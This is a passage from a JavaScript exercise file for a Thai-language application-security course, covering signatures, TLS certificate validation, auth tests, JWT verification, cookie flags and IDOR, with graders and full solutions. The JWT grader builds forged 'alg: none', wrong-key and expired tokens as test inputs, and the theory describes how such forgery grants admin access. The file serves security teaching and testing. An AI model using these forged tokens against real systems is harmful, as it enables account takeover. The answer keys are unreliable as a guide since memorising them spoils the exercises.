    • <strong>Symmetric (กุญแจเดี่ยว เช่น AES-256-GCM, ChaCha20):</strong> ใช้กุญแจดอกเดียวกันทั้งเข้ารหัสและถอดรหัส เร็วมาก เหมาะกับข้อมูลขนาดใหญ่ แต่มีจุดอ่อนเรื่องการแจกจ่ายกุญแจลับ (Key Distribution Problem)<br/>
    • <strong>Asymmetric (กุญแจคู่ เช่น RSA, ECC):</strong> ประกอบด้วย <em>Public Key (แจกทุกคน)</em> และ <em>Private Key (เก็บรักษาเป็นความลับสูงสุด)</em> ปลอดภัยในการแลกเปลี่ยนกุญแจ แต่คำนวณช้ากว่า 1,000 เท่า<br/>
    • <strong>Hybrid Encryption:</strong> โลกจริงใช้ Asymmetric เพื่อแลกเปลี่ยน Symmetric Session Key แล้วใช้ Symmetric เข้ารหัสข้อมูลจริง (หลักการของ HTTPS/TLS)<br/><br/>
    ✍️ <strong>Digital Signature ทำงานอย่างไร:</strong><br/>
    1. ผู้ส่งนำเอกสารมาทำ Hashing (เช่น SHA-256) ได้ค่า Message Digest<br/>
    2. ผู้ส่งนำ Digest นั้นมาเข้ารหัสด้วย <strong>Private Key ของผู้ส่ง</strong> กลายเป็น Digital Signature<br/>
    3. ผู้รับนำ <strong>Public Key ของผู้ส่ง</strong> มาถอดรหัส Signature ถ้าได้ค่า Hash ตรงกับเอกสาร ย่อมพิสูจน์ว่า: <em>เอกสารไม่ถูกแก้ (Integrity)</em>, <em>มาจากผู้ส่งตัวจริง (Authenticity)</em>, และ <em>ผู้ส่งไม่สามารถปฏิเสธความรับผิดชอบได้ (Non-Repudiation)</em><br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 1):</strong><br/>
    กฎเหล็กข้อสอบ Security+: <strong>"เข้ารหัสเพื่อความลับ (Confidentiality) ให้ใช้ Public Key ของผู้รับ"</strong> แต่ <strong>"เซ็นชื่อเพื่อยืนยันตัวตน (Non-Repudiation) ให้ใช้ Private Key ของผู้ส่ง"</strong>`,
    example: `// ตัวอย่าง verify ข้อความ
const isValid = verifyDigitalSignature('Transaction: Transfer $500', sigHex, pubKeyPem);
// isValid => true / false`,
    task: `จงเขียนฟังก์ชัน <code>verifyDigitalSignature(data, signature, publicKey)</code> ด้วย <code>crypto.createVerify('SHA256')</code> และคืนค่า boolean จากการตรวจสอบลายเซ็นดิจิทัลในรูปแบบ hex`
  },
  {
    id: "pki_tls_handshake",
    meta: "โมดูล 2: วิทยาการรหัสลับ",
    title: "PKI & TLS Handshake: Chain of Trust, CA และการตรวจสอบ Certificate",
    template: `// สถานการณ์: เขียนฟังก์ชัน validateTLSCertificate(cert) สำหรับตรวจสอบ SSL/TLS Certificate
// ในสภาพแวดล้อม Production เพื่อป้องกันการโจมตีแบบ Man-in-the-Middle (MitM)
// 1. ตรวจสอบวันหมดอายุ: หาก new Date() > new Date(cert.validTo) ให้ throw Error('Certificate expired')
// 2. ห้ามรับ Self-Signed Certificate: หาก cert.issuer === cert.subject และไม่ใช่ Root CA
//    ให้ throw Error('Self-signed certificate is not permitted in production')
// 3. ตรวจสอบ Trust Chain: หาก cert.authorized !== true ให้ throw Error('Untrusted Certificate Authority')
// 4. หากผ่านทั้งหมด คืน { valid: true, domain: cert.subjectAltName || cert.subject }
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการ Validate SSL/TLS Certificate และ Chain of Trust...");
      const stripped = stripComments(code);
      const hasDateCheck = /validTo/.test(stripped) && /expired/i.test(stripped);
      const hasSelfSignedCheck = /cert\.issuer\s*===?\s*cert\.subject/.test(stripped);
      const hasAuthCheck = /!cert\.authorized|cert\.authorized\s*===?\s*false/.test(stripped);
      const hasValidReturn = /valid\s*:\s*true/.test(stripped);
      if (!hasDateCheck) {
        throw new Error("ไม่พบการตรวจสอบวันหมดอายุของ Certificate");
      }
      if (!hasSelfSignedCheck) {
        throw new Error("ไม่พบการปฏิเสธ Self-Signed Certificate ใน Production");
      }
      if (!hasAuthCheck) {
        throw new Error("ไม่พบการตรวจสอบว่า Certificate ได้รับการรับรองจาก Trusted CA (cert.authorized)");
      }
      if (!hasValidReturn) {
        throw new Error("ไม่พบการส่งคืนผลลัพธ์ { valid: true } เมื่อใบรับรองถูกต้อง");
      }
      log("✓ ยืนยันได้ว่าการตรวจสอบ TLS Certificate เป็นไปตามมาตรฐานความปลอดภัย PKI");
    },
    hint: "เปรียบเทียบ Date กับ cert.validTo ก่อน จากนั้น if (cert.issuer === cert.subject && !cert.isRootCA) throw Error แล้วตามด้วย if (!cert.authorized) throw Error",
    solution: `function validateTLSCertificate(cert) {
  const now = new Date();
  if (now > new Date(cert.validTo)) {
    throw new Error('Certificate expired');
  }
  if (cert.issuer === cert.subject && !cert.isRootCA) {
    throw new Error('Self-signed certificate is not permitted in production');
  }
  if (!cert.authorized) {
    throw new Error('Untrusted Certificate Authority');
  }
  return { valid: true, domain: cert.subjectAltName || cert.subject };
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจโครงสร้าง <strong>PKI (Public Key Infrastructure)</strong> และขั้นตอน <strong>TLS Handshake</strong> ในการสร้างช่องทางสื่อสารที่ปลอดภัย<br/><br/>
    📜 <strong>Chain of Trust (สายธารแห่งความเชื่อถือ):</strong><br/>
    • <strong>Root CA:</strong> องค์กรออกใบรับรองชั้นสูงสุด กุญแจ Public Key จะถูกติดตั้งฝังไว้ใน OS/Browser ตั้งแต่โรงงาน (Trust Store)<br/>
    • <strong>Intermediate CA:</strong> ตัวแทนที่ Root CA เซ็นรับรอง เพื่อออกใบรับรองให้เว็บไซต์ทั่วไป (ป้องกัน Root CA กุญแจหลุด)<br/>
    • <strong>Server Certificate:</strong> ใบรับรองที่ติดตั้งบนเว็บเซิร์ฟเวอร์ของเรา (ระบุ Domain และ SAN - Subject Alternative Name)<br/><br/>
    ⚡ <strong>TLS 1.3 Handshake (1-RTT):</strong><br/>
    1. <strong>Client Hello:</strong> ส่งชุด Cipher Suites ที่รองรับ พร้อม Parameter ในการแลกเปลี่ยนกุญแจ (Key Share - Diffie-Hellman)<br/>
    2. <strong>Server Hello + Certificate:</strong> เซิร์ฟเวอร์ส่ง Certificate พร้อม Key Share กลับมา<br/>
    3. <strong>Verification:</strong> เบราว์เซอร์ตรวจว่า CA น่าเชื่อถือไหม, ใบรับรองหมดอายุหรือถูกเพิกถอน (CRL/OCSP) หรือไม่<br/>
    4. <strong>Session Key Generated:</strong> ทั้งสองฝั่งคำนวณ Symmetric Session Key ได้ตรงกัน และเริ่มส่งข้อมูลเข้ารหัสได้ทันที<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 3):</strong><br/>
    ข้อสอบมักถามเรื่องการยกเลิกใบรับรอง: <strong>CRL (Certificate Revocation List)</strong> ช้าและไฟล์ใหญ่ ปัจจุบันจึงนิยม <strong>OCSP (Online Certificate Status Protocol)</strong> หรือ <strong>OCSP Stapling</strong> ที่เซิร์ฟเวอร์แนบสถานะ CA มาพร้อม Handshake เพื่อประหยัดเวลา`,
    example: `const testCert = { validTo: '2027-01-01', issuer: 'Let\\'s Encrypt Authority X3', subject: 'example.com', authorized: true };
const res = validateTLSCertificate(testCert);
// res => { valid: true, domain: 'example.com' }`,
    task: `จงเขียนฟังก์ชัน <code>validateTLSCertificate(cert)</code> ให้สมบูรณ์ โดยปฏิเสธใบรับรองที่หมดอายุ, ใบรับรอง Self-Signed และใบรับรองที่ไม่ได้ผ่าน Trusted CA พร้อมคืน <code>{ valid: true, domain }</code> เมื่อถูกต้อง`
  },
  {
    id: "auth_bypass_prevention",
    meta: "โมดูล 2: วิทยาการรหัสลับ",
    title: "Authentication vs Authorization: ทดสอบ Auth Middleware ให้ครอบคลุมทุก Endpoint",
    template: `// สถานการณ์: ทดสอบ API ด้านความปลอดภัยเพื่อยืนยันว่า Private Endpoints ถูกป้องกันอย่างแท้จริง
// บั๊กที่พบบ่อยในการพัฒนา: Dev เพิ่ม endpoint ใหม่แต่ลืมผูก Auth Middleware เข้าไป
// 1. กำหนดอาร์เรย์ protectedEndpoints: ['/api/admin/users', '/api/admin/settings', '/api/admin/audit-logs']
// 2. ใช้ request fixture ยิง GET ไปยังทุก endpoint ในลูป โดยไม่ส่ง header Authorization เลย
// 3. ยืนยันด้วย expect ว่าทุก endpoint ต้องตอบกลับ status 401 (Unauthorized) ไม่มีข้อยกเว้น
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบความครอบคลุมของการป้องกัน Authentication ในทุก Private Endpoint...");
      const stripped = stripComments(code);
      const hasEndpoints = ['/api/admin/users', '/api/admin/settings', '/api/admin/audit-logs'].every(ep => stripped.includes(ep));
      const hasLoop = /for\s*\(/.test(stripped);
      const hasGet = /request\.get\(/.test(stripped);
      const has401 = /expect\(.*status\(\)\)\.toBe\(401\)/.test(stripped);
      if (!hasEndpoints) {
        throw new Error("ยังไม่ได้ทดสอบ endpoint กลุ่ม admin ครบทั้ง 3 รายการตามที่กำหนด");
      }
      if (!hasLoop || !hasGet) {
        throw new Error("ต้องใช้ลูปยิง request.get ไปยังทุก endpoint เพื่อตรวจสอบความครอบคลุม");
      }
      if (!has401) {
        throw new Error("ไม่พบการตรวจสอบ assertion ว่า status code ต้องเป็น 401");
      }
      log("✓ ยืนยันได้ว่า Auth Middleware ถูกผูกและบังคับใช้ครบทุก Private Endpoint จริง");
    },
    hint: "วนลูป for (const ep of protectedEndpoints) { const res = await request.get(ep); expect(res.status()).toBe(401); }",
    solution: `import { test, expect } from '@playwright/test';

const protectedEndpoints = [
  '/api/admin/users',
  '/api/admin/settings',
  '/api/admin/audit-logs'
];

test('ทุก endpoint ภายใต้กลุ่ม admin ต้องปฏิเสธ request ที่ไม่มี authentication', async ({ request }) => {
  for (const endpoint of protectedEndpoints) {
    const response = await request.get(endpoint);
    expect(response.status()).toBe(401);
  }
});`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจความแตกต่างระหว่าง <strong>Authentication</strong> กับ <strong>Authorization</strong> และการเขียน Automation Test ตรวจสอบ Security Coverage<br/><br/>
    ⚖️ <strong>Authentication (AuthN) vs Authorization (AuthZ):</strong><br/>
    • <strong>Authentication (401 Unauthorized):</strong> ตรวจสอบว่า <em>"คุณคือใคร?"</em> (ยืนยันอัตลักษณ์ด้วย Password, OTP, API Key, Token)<br/>
    • <strong>Authorization (403 Forbidden):</strong> ตรวจสอบว่า <em>"คุณมีสิทธิ์ทำสิ่งนี้หรือไม่?"</em> (ยืนยันสิทธิ์ตาม Role, Group หรือ Ownership หลังจากล็อกอินแล้ว)<br/><br/>
    🚨 <strong>ทำไมต้องทดสอบ Coverage ทุก Endpoint:</strong><br/>
    ในเฟรมเวิร์กอย่าง Express.js หรือ Fastify นักพัฒนามักต้องผูก Middleware ป้องกันทีละ Route การเพิ่ม Route ใหม่แล้วลืมใส่ Middleware เป็นช่องโหว่พบบ่อยมากที่ทำให้แฮกเกอร์ข้ามการตรวจสิทธิ์เข้ามาดึงข้อมูลได้ทันที<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 & eJPT):</strong><br/>
    ข้อสอบมักถามแยกความต่างของ Status Code: หากยังไม่ได้ล็อกอินหรือส่ง Token ผิด ระบบต้องตอบ <strong>401 Unauthorized</strong> | หากล็อกอินเป็น User ทั่วไปแต่พยายามเข้าหน้า Admin ระบบต้องตอบ <strong>403 Forbidden</strong>`,
    example: `// ตัวอย่างผลตอบกลับ 401 เมื่อขาด Auth Header
const res = await request.get('/api/admin/metrics');
expect(res.status()).toBe(401);`,
    task: `จงเขียน Playwright Test เพื่อวนลูปยิง GET ไปยัง endpoint ทั้ง 3 ตัว (<code>/api/admin/users</code>, <code>/api/admin/settings</code>, <code>/api/admin/audit-logs</code>) แบบไม่มี auth header และตรวจสอบว่าทุกตัวตอบ <code>401</code>`
  },
  {
    id: "jwt_attacks_tampering",
    meta: "โมดูล 2: วิทยาการรหัสลับ",
    title: "JWT Security: ช่องโหว่ Algorithm Confusion (alg: none) และ Token Tampering",
    template: `// สถานการณ์: ตรวจสอบความปลอดภัยของ JSON Web Token (JWT) Parser
// ป้องกัน 3 ช่องโหว่สำคัญ:
// 1. Algorithm Confusion: ผู้โจมตีเปลี่ยน Header เป็น {"alg":"none"}
// 2. Token Tampering: ผู้โจมตีแก้ไข Payload โดยไม่มี Signature ที่ถูกต้อง
// 3. Expired Token: ผู้โจมตีนำ Token เก่าที่หมดอายุมาใช้ซ้ำ (Replay Attack)
//
// ข้อกำหนดฟังก์ชัน verifyJWTTokenSafely(token, allowedAlg, secret):
// 1. นำเข้า crypto module (import crypto from 'node:crypto')
// 2. แยก token ออกเป็น 3 ส่วน [headerB64, payloadB64, signatureB64] ด้วย .split('.')
// 3. ถอดรหัส JSON จาก Base64Url
// 4. หาก header.alg เป็น 'none' หรือไม่ตรงกับ allowedAlg ให้ throw Error('Rejected algorithm')
// 5. หากไม่มี signatureB64 ให้ throw Error('Missing signature')
// 6. คำนวณ HMAC-SHA256 signature จาก headerB64 + '.' + payloadB64 ด้วย secret
//    และเปรียบเทียบกับ signatureB64 ด้วย crypto.timingSafeEqual เพื่อป้องกัน Timing Attacks
//    หาก signature ไม่ตรง ให้ throw Error('Invalid signature')
// 7. หาก payload มี exp และ payload.exp * 1000 < Date.now() ให้ throw Error('Token expired')
// 8. หากผ่านทุกเงื่อนไข ให้คืน { valid: true, user: payload.sub }
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบโครงสร้างและการทำงานจริงของ verifyJWTTokenSafely()...");
      const stripped = stripComments(code);
      if (!stripped.includes('.split(')) {
        throw new Error("ต้องใช้ .split('.') แยกส่วนประกอบของ JWT");
      }
      if (!/timingSafeEqual/.test(stripped) && !/createHmac/.test(stripped)) {
        throw new Error("ต้องคำนวณ HMAC และเปรียบเทียบ Signature ด้วย crypto.timingSafeEqual เพื่อป้องกัน Timing Attack");
      }

      const fn = getLearnerFn(code, 'verifyJWTTokenSafely');
      log("✓ ดึงฟังก์ชัน verifyJWTTokenSafely สำเร็จ กำลังยิง Attack Payloads จำลอง...");

      const secret = 'super-secret-key-for-test-32bytes!';
      const makeToken = (h, p, s = secret) => {
        const hb = sandboxBuffer.from(JSON.stringify(h)).toString('base64url');
        const pb = sandboxBuffer.from(JSON.stringify(p)).toString('base64url');
        const sig = sandboxCrypto.createHmac('sha256', s).update(hb + '.' + pb).digest('base64url');
        return hb + '.' + pb + '.' + sig;
      };

      // 1. Test Valid Token
      const validTkn = makeToken({ alg: 'HS256', typ: 'JWT' }, { sub: 'alice', exp: Math.floor(Date.now() / 1000) + 3600 });
      const res = fn(validTkn, 'HS256', secret);
      if (!res || !res.valid || res.user !== 'alice') {
        throw new Error("Token ที่ถูกต้องสมบูรณ์ต้องคืนค่า { valid: true, user: 'alice' }");
      }

      // 2. Test alg: none attack
      let caughtAlgNone = false;
      try {
        const noneTkn = sandboxBuffer.from(JSON.stringify({ alg: 'none' })).toString('base64url') + '.' +
                        sandboxBuffer.from(JSON.stringify({ sub: 'attacker' })).toString('base64url') + '.';
        fn(noneTkn, 'HS256', secret);
      } catch (e) {
        caughtAlgNone = true;
      }
      if (!caughtAlgNone) {
        throw new Error("ช่องโหว่: ฟังก์ชันยอมรับ Token ที่มี header alg: 'none' โดยไม่ throw Error");
      }

      // 3. Test Signature Tampering (Forged token with wrong key or altered signature)
      let caughtTampering = false;
      try {
        const forgedTkn = makeToken({ alg: 'HS256', typ: 'JWT' }, { sub: 'attacker' }, 'wrong-secret-key');
        fn(forgedTkn, 'HS256', secret);
      } catch (e) {
        caughtTampering = true;
      }
      if (!caughtTampering) {
        throw new Error("ช่องโหว่: ฟังก์ชันยอมรับ Token ที่ถูกดัดแปลง Signature โดยไม่ throw Error");
      }

      // 4. Test Expired Token
      let caughtExpired = false;
      try {
        const expTkn = makeToken({ alg: 'HS256', typ: 'JWT' }, { sub: 'bob', exp: Math.floor(Date.now() / 1000) - 3600 });
        fn(expTkn, 'HS256', secret);
      } catch (e) {
        caughtExpired = true;
      }
      if (!caughtExpired) {
        throw new Error("ช่องโหว่: ฟังก์ชันยอมรับ Token ที่หมดอายุ (expired) โดยไม่ throw Error");
      }

      log("✓ ผ่านการทดสอบครบทุก Attack Scenarios (Valid, Alg:none, Tampered Signature, Expired Token)");
    },
    hint: "แยก const [headerB64, payloadB64, signatureB64] = token.split('.'); คำนวณ expectedSig = crypto.createHmac('sha256', secret).update(headerB64 + '.' + payloadB64).digest('base64url'); แล้วเทียบด้วย crypto.timingSafeEqual(Buffer.from(expectedSig), Buffer.from(signatureB64))",
    solution: `import crypto from 'node:crypto';

function verifyJWTTokenSafely(token, allowedAlg, secret) {
  const parts = token.split('.');
  if (parts.length !== 3) {
    throw new Error('Malformed token');
  }
  const [headerB64, payloadB64, signatureB64] = parts;
  if (!headerB64 || !payloadB64 || !signatureB64) {
    throw new Error('Missing signature or payload');
  }

  const header = JSON.parse(Buffer.from(headerB64, 'base64url').toString('utf8'));
  const payload = JSON.parse(Buffer.from(payloadB64, 'base64url').toString('utf8'));

  if (!header.alg || header.alg.toLowerCase() === 'none' || header.alg !== allowedAlg) {
    throw new Error('Rejected algorithm: ' + header.alg);
  }

  const expectedSig = crypto
    .createHmac('sha256', secret)
    .update(headerB64 + '.' + payloadB64)
    .digest('base64url');

  const expectedBuf = Buffer.from(expectedSig);
  const actualBuf = Buffer.from(signatureB64);

  if (expectedBuf.length !== actualBuf.length || !crypto.timingSafeEqual(expectedBuf, actualBuf)) {
    throw new Error('Invalid signature');
  }

  if (payload.exp && payload.exp * 1000 < Date.now()) {
    throw new Error('Token expired');
  }
  return { valid: true, user: payload.sub };
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจโครงสร้างของ <strong>JWT (JSON Web Token)</strong> และป้องกันช่องโหว่ <strong>Algorithm Confusion Attack</strong><br/><br/>
    🧩 <strong>โครงสร้าง 3 ส่วนของ JWT (คั่นด้วยจุด .):</strong><br/>
    • <code>Header</code>: ระบุประเภท Token และ Algorithm ที่ใช้เข้ารหัส (เช่น <code>{"alg":"HS256","typ":"JWT"}</code>)<br/>
    • <code>Payload (Claims)</code>: ข้อมูลผู้ใช้ สิทธิ์ และวันหมดอายุ (เช่น <code>sub</code>, <code>role</code>, <code>exp</code>)<br/>
    • <code>Signature</code>: ลายเซ็นดิจิทัลที่สร้างจากการ Hash (Header + Payload) ด้วย Secret Key<br/><br/>
    💥 <strong>Algorithm Confusion Attack (alg: "none"):</strong><br/>
    ในข้อกำหนดดั้งเดิมของ JWT มีอัลกอริทึม <code>"none"</code> สำหรับกรณีที่ไม่ต้องการลายเซ็น หากเซิร์ฟเวอร์เชื่อค่า <code>alg</code> ที่ client ส่งมาตรงๆ ผู้โจมตีสามารถแก้ไข payload เปลี่ยนตัวเองเป็น <code>"role":"admin"</code> แล้วเปลี่ยน header เป็น <code>"alg":"none"</code> ตัด signature ทิ้ง เซิร์ฟเวอร์ที่อ่อนแอก็จะยอมรับ token ปลอมทันที!<br/><br/>
    🛡️ <strong>หลักการตั้งค่า JWT ที่ปลอดภัย:</strong><br/>
    1. <strong>Enforce Allowed Algorithms:</strong> บังคับระบุอัลกอริทึมฝั่งเซิร์ฟเวอร์ (เช่น ต้องเป็น <code>HS256</code> หรือ <code>RS256</code> เท่านั้น) ไม่อ่านตามที่ header ร้องขอ<br/>
    2. <strong>Strong Secret Key:</strong> ใช้ Symmetric Key ที่มีความสุ่มสูงอย่างน้อย 256 bits (ป้องกัน Offline Brute-force)<br/>
    3. <strong>Check Expiration:</strong> ตรวจสอบ claim <code>exp</code> เสมอเพื่อลดความเสี่ยงจากการถูกนำ Token เก่ามา Replay<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (PortSwigger BSCP & eWPT):</strong><br/>
    ในแล็บ PortSwigger Web Security การทดสอบ JWT Attacks จะเริ่มจากการทดลองเปลี่ยน <code>alg: none</code> หรือลองสลับระหว่าง Symmetric (HMAC) กับ Asymmetric (RSA) เสมอ`,
    example: `// ตัวอย่าง Token ปลอดภัย
const res = verifyJWTTokenSafely(validJwtString, 'HS256', 'super-secret-key-32chars');
// res => { valid: true, user: 'admin' }`,
    task: `จงเขียนฟังก์ชัน <code>verifyJWTTokenSafely(token, allowedAlg, secret)</code> เพื่อป้องกันการโจมตี <code>alg: none</code>, ตรวจสอบการมีอยู่ของ signature และยืนยันว่า token ยังไม่หมดอายุ`
  },
  {
    id: "session_management_cookies",
    meta: "โมดูล 2: วิทยาการรหัสลับ",
    title: "Session Management: ตั้งค่า HttpOnly, Secure, และ SameSite ป้องกัน Session Hijacking",
    template: `// สถานการณ์: ตรวจสอบความปลอดภัยของ Session Cookie หลังผู้ใช้ทำการล็อกอิน
// เพื่อป้องกันการขโมย Session ID ไปสวมรอย (Session Hijacking)
// 1. ทำการล็อกอินสำเร็จแล้วดึงคุกกี้ทั้งหมดจาก browser context ด้วย page.context().cookies()
// 2. ค้นหา cookie ชื่อ 'sessionId'
// 3. ตรวจสอบว่า sessionId ต้องมี httpOnly เป็น true (ป้องกัน JavaScript ขโมยผ่าน XSS)
// 4. ตรวจสอบว่า sessionId ต้องมี secure เป็น true (ส่งผ่าน HTTPS เท่านั้น)
// 5. ตรวจสอบว่า sameSite ต้องมีค่าเป็น 'Strict' หรือ 'Lax' (บรรเทาความเสี่ยง CSRF)
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบ Session Cookie Security Flags...");
      const stripped = stripComments(code);
      const hasCookies = /page\.context\(\)\.cookies\(\)/.test(stripped);
      const hasFindSession = /\.find\(\s*\(?\w*\)?\s*=>\s*\w+\.name\s*===?\s*['"]sessionId['"]/.test(stripped);
      const hasHttpOnly = /expect\(\s*\w+\.httpOnly\s*\)\.toBe\(true\)/.test(stripped);
      const hasSecure = /expect\(\s*\w+\.secure\s*\)\.toBe\(true\)/.test(stripped);
      const hasSameSite = /sameSite/.test(stripped) && /Strict|Lax/.test(stripped);
      if (!hasCookies || !hasFindSession) {
        throw new Error("ไม่พบการดึง cookies หรือการค้นหา cookie ชื่อ 'sessionId'");
      }
      if (!hasHttpOnly || !hasSecure) {
        throw new Error("ไม่พบการตรวจสอบว่า httpOnly และ secure ต้องเป็น true ทั้งคู่");
      }
      if (!hasSameSite) {
        throw new Error("ไม่พบการตรวจสอบว่า sameSite ต้องเป็น 'Strict' หรือ 'Lax'");
      }
      log("✓ ยืนยันได้ว่า Session Cookie ได้รับการปกป้องด้วย Security Flags ครบถ้วนตามมาตรฐาน");
    },
    hint: "ค้นหา cookie ชื่อ 'sessionId' จาก cookies array แล้วใช้ expect(session.httpOnly).toBe(true); expect(session.secure).toBe(true); expect(['Strict', 'Lax']).toContain(session.sameSite);",
    solution: `import { test, expect } from '@playwright/test';

test('Session cookie ต้องตั้งค่าความปลอดภัยครบถ้วน', async ({ page }) => {
  await page.goto('/login');
  await page.getByTestId('email-input').fill('user@example.com');
  await page.getByTestId('password-input').fill('SecretPass123!');
  await page.getByTestId('login-submit-btn').click();

  const cookies = await page.context().cookies();
  const session = cookies.find((c) => c.name === 'sessionId');

  expect(session).toBeDefined();
  expect(session.httpOnly).toBe(true);
  expect(session.secure).toBe(true);
  expect(['Strict', 'Lax']).toContain(session.sameSite);
});`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจการทำงานของ <strong>Session Management</strong> และบทบาทของ Cookie Flags ในการป้องกันการโจมตีระดับเบราว์เซอร์<br/><br/>
    🍪 <strong>3 ปราการเหล็กของ Cookie Security:</strong><br/>
    • <code>HttpOnly</code>: ป้องกันไม่ให้ JavaScript ฝั่ง Client อ่านค่าคุกกี้ผ่าน <code>document.cookie</code> ได้ (แม้เว็บจะมีช่องโหว่ XSS แฮกเกอร์ก็ไม่สามารถขโมย Session ID ไปได้)<br/>
    • <code>Secure</code>: บังคับให้เบราว์เซอร์ส่งคุกกี้นี้เฉพาะเมื่อเชื่อมต่อผ่านโปรโตคอล <strong>HTTPS</strong> ที่เข้ารหัสแล้วเท่านั้น ป้องกันการดักจับแพ็กเก็ตผ่านเครือข่าย Wi-Fi สาธารณะ (MitM / Packet Sniffing)<br/>
    • <code>SameSite</code>: ควบคุมการส่งคุกกี้ในการเรียกคำขอข้ามเว็บไซต์ (Cross-Site Requests) เพื่อป้องกัน CSRF:<br/>
      - <strong>Strict:</strong> ส่งคุกกี้เฉพาะเมื่อคำขอมาจากเว็บไซต์เดียวกันเท่านั้น<br/>
      - <strong>Lax:</strong> ยอมส่งคุกกี้เมื่อผู้ใช้กดลิงก์ธรรมดา (Top-level GET Navigation) มาจากภายนอก แต่ห้ามส่งสำหรับคำขอที่เกิดจาก Form POST หรือ Script ข้ามเว็บ<br/>
      - <strong>None:</strong> ส่งข้ามเว็บได้อิสระ แต่ต้องใช้คู่กับ <code>Secure</code> เสมอ<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 2 & 3):</strong><br/>
    ข้อสอบ Security+ มักถามว่า: <em>"แฮกเกอร์ฝัง JavaScript เพื่อขโมย Session Cookie ของผู้ใช้ ถามว่าคอนฟิกใดช่วยป้องกันการขโมยคุกกี้กรณีนี้ได้?"</em> ➡️ คำตอบที่ถูกต้องคือการตั้งค่า <strong>HttpOnly flag</strong>`,
    example: `// ตัวอย่างการตรวจสอบ Cookie ในการทดสอบจริง
expect(session.httpOnly).toBe(true);
expect(session.secure).toBe(true);`,
    task: `จงเขียน Playwright Test เพื่อตรวจสอบคุกกี้ <code>sessionId</code> ว่าเปิดใช้งาน <code>httpOnly: true</code>, <code>secure: true</code> และ <code>sameSite</code> เป็น <code>Strict</code> หรือ <code>Lax</code>`
  },

  // ==========================================
  // MODULE 3: DEEP-DIVE OWASP TOP 10 & OFFENSIVE APPSEC
  // ==========================================
  {
    id: "broken_access_control_idor",
    meta: "โมดูล 3: OWASP Top 10",
    title: "IDOR & BOLA: Horizontal vs Vertical Privilege Escalation (OWASP #1 Broken Access Control)",
    template: `// สถานการณ์: ทดสอบช่องโหว่ IDOR (Insecure Direct Object Reference) ในระบบ Multi-Tenant
// ผู้ใช้ A ล็อกอินผ่านเรียบร้อย ได้รับ tokenA (Authentication ผ่านแล้ว)
// แต่เมื่อพยายามเข้าถึงเอกสารบัญชีของผู้ใช้ B (/api/accounts/user-b-999)
// ระบบที่ดีต้องตรวจสอบ Authorization (สิทธิ์ความเป็นเจ้าของ) และปฏิเสธคำขอ
// 1. ใช้ request fixture ยิง GET ไปที่ '/api/accounts/user-b-999'
// 2. แนบ header 'Authorization: Bearer valid-token-user-a'
// 3. ยืนยันด้วย expect ว่า status ต้องเป็น 403 (Forbidden) หรือ 404 (Not Found) เท่านั้น ห้ามเป็น 200
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการป้องกันช่องโหว่ IDOR / BOLA...");
      const stripped = stripComments(code);
      const hasRequest = /request\.get\(['"`].*\/api\/accounts\/user-b-999['"`]/.test(stripped);
      const hasAuthHeader = /Authorization|Bearer/.test(stripped);
      const hasDenyStatus = /expect\(.*status\(\)\)\.toBe\((403|404)\)/.test(stripped) ||
                            /expect\(\[(403,\s*404|404,\s*403)\]\)\.toContain\(.*status\(\)\)/.test(stripped);
      if (!hasRequest) {
        throw new Error("ไม่พบการยิง request ไปยัง resource ของผู้ใช้อื่น (/api/accounts/user-b-999)");
      }
      if (!hasAuthHeader) {
        throw new Error("ไม่พบการใส่ Token ของผู้ใช้ A (จุดสำคัญของ IDOR คือ AuthN ผ่านแล้ว แต่ต้องติด AuthZ)");
      }
      if (!hasDenyStatus) {
        throw new Error("ไม่พบการตรวจสอบว่า status ต้องเป็น 403 หรือ 404");
      }
      log("✓ ยืนยันได้ว่าระบบมีการเช็คสิทธิ์ความเป็นเจ้าของ ป้องกันช่องโหว่ Broken Access Control");
    },
    hint: "ยิง request.get('/api/accounts/user-b-999', { headers: { Authorization: 'Bearer token-user-a' } }) แล้ว assert ว่า status code ต้องเป็น 403 หรือ 404",
    solution: `import { test, expect } from '@playwright/test';

test('ป้องกัน IDOR: ปฏิเสธการเข้าถึงข้อมูลของบัญชีอื่น', async ({ request }) => {
  const tokenA = 'valid-bearer-token-for-user-a';
  const response = await request.get('/api/accounts/user-b-999', {
    headers: { Authorization: 'Bearer ' + tokenA }
  });

  expect([403, 404]).toContain(response.status());
});`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจช่องโหว่อันดับ 1 ของโลก <strong>OWASP A01:2021 – Broken Access Control</strong> ในรูปแบบ <strong>IDOR (Insecure Direct Object Reference)</strong> หรือ <strong>BOLA</strong><br/><br/>
    ⚖️ <strong>Horizontal vs Vertical Privilege Escalation:</strong><br/>
    • <strong>Horizontal Privilege Escalation (การเลื่อนระดับสิทธิ์ในแนวนอน):</strong> ผู้ใช้ทั่วไปคนหนึ่งเข้าถึงข้อมูลของผู้ใช้คนอื่นในระดับสิทธิ์เดียวกัน เช่น บัญชี A แอบเปลี่ยน URL จาก <code>/invoice/1001</code> เป็น <code>/invoice/1002</code> เพื่อแอบดูใบเสร็จของบัญชี B<br/>
    • <strong>Vertical Privilege Escalation (การเลื่อนระดับสิทธิ์ในแนวตั้ง):</strong> ผู้ใช้ระดับธรรมดาแอบเข้าถึงหรือสั่งรันฟังก์ชันของผู้ดูแลระบบ (Admin) เช่น เข้าถึง <code>/api/admin/users/delete</code> สำเร็จเพราะระบบลืมตรวจ Role<br/><br/>
